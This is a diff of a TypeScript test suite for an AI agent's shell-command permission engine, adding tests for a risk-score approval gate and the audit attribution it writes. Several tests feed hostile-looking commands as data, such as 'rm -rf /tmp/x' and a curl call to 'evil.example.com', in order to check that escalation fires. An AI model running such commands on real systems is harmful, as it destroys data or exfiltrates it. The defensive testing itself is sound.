@@ -411,15 +411,17 @@ describe('compound command guard (shell injection defense)', () => {
   });
 
   test('quoted metachars do NOT trigger the guard', () => {
-    // git commit -m "fix; close" — the `;` is literal inside
-    // double quotes; not a real injection. The matcher correctly
-    // treats it as part of the message.
-    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git commit*'] } } }), {
+    // `echo "fix; close #1"` — the `;` is literal inside double
+    // quotes; not a real injection. The matcher correctly treats
+    // it as part of the message. Uses echo (pure-output, score 0,
+    // high confidence) so the §6.6 approval-gate doesn't shadow
+    // the compound-guard signal we're testing for.
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
       cwd: CWD,
       provenance: { defaults: 'project', bash: 'project' },
     });
     const d = eng.check('bash', 'bash', {
-      command: 'git commit -m "fix; close #1"',
+      command: 'echo "fix; close #1"',
     });
     // Allow rule fires normally; no compound detected.
     expect(d.kind).toBe('allow');
@@ -599,12 +601,13 @@ describe('compound command guard (shell injection defense)', () => {
     // Counter-test: `>&1`, `>&2`, `>&-` are fd
     // duplication / closure — no filesystem mutation. The legacy
     // `>&word` distinction must NOT regress the common stderr-
-    // merging idiom.
-    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm test*'] } } }), {
+    // merging idiom. Uses `ls` (high confidence, score 0) so the
+    // §6.6 approval-gate doesn't shadow the fd-dup signal.
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
       cwd: CWD,
       provenance: { defaults: 'project', bash: 'project' },
     });
-    const d = eng.check('bash', 'bash', { command: 'npm test >&2' });
+    const d = eng.check('bash', 'bash', { command: 'ls -la >&2' });
     expect(d.kind).toBe('allow');
   });
 
@@ -649,12 +652,13 @@ describe('compound command guard (shell injection defense)', () => {
     // is fd duplication / closure, not a separator and not a file
     // write. Forcing confirm on every stderr merge would make
     // standard shell idioms unusable through the gate without
-    // runtime promotion.
-    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm test*'] } } }), {
+    // runtime promotion. Uses `ls` (high confidence, score 0) so
+    // the §6.6 approval-gate doesn't shadow the fd-dup signal.
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
       cwd: CWD,
       provenance: { defaults: 'project', bash: 'project' },
     });
-    const d = eng.check('bash', 'bash', { command: 'npm test 2>&1' });
+    const d = eng.check('bash', 'bash', { command: 'ls -la 2>&1' });
     expect(d.kind).toBe('allow');
   });
 
@@ -685,13 +689,17 @@ describe('Decision.source provenance', () => {
   });
 
   test('bash allow rule carries source from the layer that wrote bash', () => {
-    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm test*'] } } }), {
+    // `ls` is high confidence, score 0 — keeps the test focused on
+    // provenance attribution (not the §6.6 approval-gate, which
+    // would otherwise upgrade a medium-confidence resolver result
+    // like `npm` to confirm and obscure the source check).
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
       cwd: CWD,
       provenance: { defaults: 'project', bash: 'user' },
     });
-    const d = eng.check('bash', 'bash', { command: 'npm test --watch' });
+    const d = eng.check('bash', 'bash', { command: 'ls -la' });
     expect(d.kind).toBe('allow');
-    expect(d.source).toEqual({ layer: 'user', rule: 'npm test*', section: 'bash' });
+    expect(d.source).toEqual({ layer: 'user', rule: 'ls*', section: 'bash' });
   });
 
   test('bash confirm rule carries source', () => {
@@ -1819,5 +1827,173 @@ describe('engine — classifier hint (§6.4 integration)', () => {
     // Belt-and-braces: explicitly check no raw-arg / command field.
     expect((seen as Record<string, unknown>).args).toBeUndefined();
     expect((seen as Record<string, unknown>).command).toBeUndefined();
+  });
+});
+
+describe('engine — approval gate consumes score (§6.6, slice 7)', () => {
+  const PROJ = '/work/proj';
+
+  interface CapturedEmit {
+    decision: 'allow' | 'deny' | 'confirm';
+    score?: number;
+    reason_chain: ReadonlyArray<{ stage: string; note?: string }>;
+  }
+
+  const captureSink = (collected: CapturedEmit[]) => ({
+    emit(input: CapturedEmit) {
+      collected.push(input);
+      return { seq: collected.length, this_hash: `fake-${collected.length}` };
+    },
+    verifyChain() {
+      return { ok: true as const, rows: collected.length };
+    },
+  });
+
+  // Score-0 / high-confidence baseline: passes through as allow when
+  // the policy admits the command. Sanity check that the §6.6 gate
+  // doesn't fire on the safe-by-default path.
+  test('allow + high-confidence + score < 0.4 → allow', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
+      cwd: PROJ,
+    });
+    const d = eng.check('bash', 'bash', { command: 'ls -la' });
+    expect(d.kind).toBe('allow');
+  });
+
+  // `git commit` → resolver returns `git-write` capability with
+  // high confidence; risk-score adds +0.40 for `capability_risk`
+  // (git-write ∈ critical set). Final score is exactly 0.40 — the
+  // boundary case for §6.6 ("score >= 0.4 → confirm").
+  test('boundary: score exactly at threshold (0.4) → confirm', () => {
+    const collected: CapturedEmit[] = [];
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
+      cwd: PROJ,
+      audit: captureSink(collected),
+    });
+    const d = eng.check('bash', 'bash', { command: 'git commit -m msg' });
+    expect(d.kind).toBe('confirm');
+    expect(collected[0]?.score).toBeGreaterThanOrEqual(0.4);
+  });
+
+  // `rm -rf` triggers both capability_risk (delete-fs) and
+  // blocklist_command (`rm -rf` substring) — score well above 0.4.
+  test('score > threshold → confirm', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm*'] } } }), {
+      cwd: PROJ,
+    });
+    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
+    expect(d.kind).toBe('confirm');
+  });
+
+  // §6.6 second disjunct: confidence != high forces confirm even
+  // when the score itself is below the threshold. `npm test` lands
+  // medium confidence via cmdPkgInstall in the slice 6 resolver.
+  test('allow + medium confidence → confirm (regardless of score)', () => {
+    const collected: CapturedEmit[] = [];
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm*'] } } }), {
+      cwd: PROJ,
+      audit: captureSink(collected),
+    });
+    const d = eng.check('bash', 'bash', { command: 'npm test' });
+    expect(d.kind).toBe('confirm');
+    // Score components include `confidence_medium` (+0.10) but the
+    // gate firing is attributed to the confidence side of §6.6, not
+    // the score side — the chain entry below pins that.
+    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
+    expect(stages).toContain('approval-gate');
+  });
+
+  // Custom threshold knob — production tuning per §6.3.2 calibration.
+  // Pushing the threshold to 1.0 effectively disables score-side
+  // gating; the confidence side still fires for non-high resolvers.
+  test('custom scoreConfirmThreshold respected (high value disables score-side gate)', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
+      cwd: PROJ,
+      scoreConfirmThreshold: 1.0,
+    });
+    // git commit score = 0.4 ≪ 1.0; high confidence; no upgrade.
+    const d = eng.check('bash', 'bash', { command: 'git commit -m msg' });
+    expect(d.kind).toBe('allow');
+  });
+
+  // Symmetric direction: a very tight threshold escalates earlier.
+  // `curl evil.example.com` carries `untrusted_egress` (+0.25);
+  // baseline threshold 0.4 keeps it as allow, but threshold 0.2
+  // gates it.
+  test('custom scoreConfirmThreshold respected (low value escalates earlier)', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['curl*'] } } }), {
+      cwd: PROJ,
+      scoreConfirmThreshold: 0.2,
+    });
+    const d = eng.check('bash', 'bash', { command: 'curl https://evil.example.com/data' });
+    expect(d.kind).toBe('confirm');
+  });
+
+  // bypass mode is an explicit operator override (defaults.mode='bypass'
+  // in policy) — every decision returns allow regardless of score.
+  // The score-gate must NOT undo the bypass shortcut.
+  test('bypass mode skips score-gating', () => {
+    const eng = createPermissionEngine(policy({ defaults: { mode: 'bypass' }, tools: {} }), {
+      cwd: PROJ,
+    });
+    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
+    expect(d.kind).toBe('allow');
+  });
+
+  // Session-allow exempts a shape from BOTH the resolver-forced
+  // upgrade (slice 3) and the score-gate (slice 7). Operator already
+  // saw the modal once and explicitly trusted the literal pattern.
+  test('session-allow exempts a shape from score-gating', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm*'] } } }), {
+      cwd: PROJ,
+    });
+    eng.addSessionAllow('bash', 'rm -rf /tmp/x');
+    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
+    expect(d.kind).toBe('allow');
+    expect(d.source?.layer).toBe('session');
+  });
+
+  // Audit attribution: when the score is what forced the confirm,
+  // the reason chain gains a stable `approval-gate` entry naming
+  // the trigger (score or confidence side). Operators reading the
+  // modal preview / `/perms why` see exactly which §6.6 rule fired.
+  test('reason chain carries approval-gate stage when score forces confirm', () => {
+    const collected: CapturedEmit[] = [];
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
+      cwd: PROJ,
+      audit: captureSink(collected),
+    });
+    eng.check('bash', 'bash', { command: 'git commit -m msg' });
+    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
+    expect(stages).toContain('approval-gate');
+    const entry = collected[0]?.reason_chain.find((e) => e.stage === 'approval-gate');
+    expect(entry?.note).toMatch(/^score=\d+\.\d{2} >= threshold=0\.40$/);
+  });
+
+  // Tail-stage attribution precedence: degraded > resolver-forced >
+  // score-gate. When both degraded AND score-gate fire, the audit
+  // row should attribute to engine-state (degraded), not
+  // approval-gate. The decision is confirm either way; the
+  // attribution chain tells the operator WHY.
+  test('degraded state attribution wins over approval-gate', () => {
+    const collected: CapturedEmit[] = [];
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
+      cwd: PROJ,
+      audit: captureSink(collected),
+      initialState: 'degraded',
+    });
+    eng.check('bash', 'bash', { command: 'git commit -m msg' });
+    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
+    expect(stages).toContain('engine-state');
+    expect(stages).not.toContain('approval-gate');
+  });
+
+  // Misc category short-circuits the resolver — score is 0 and the
+  // approval-gate must not invent confidence data from the missing
+  // resolver result. allow flows through unchanged.
+  test('misc category bypasses score-gate cleanly', () => {
+    const eng = createPermissionEngine(policy({}), { cwd: PROJ });
+    const d = eng.check('mystery_misc_tool', 'misc', {});
+    expect(d.kind).toBe('allow');
   });
 });
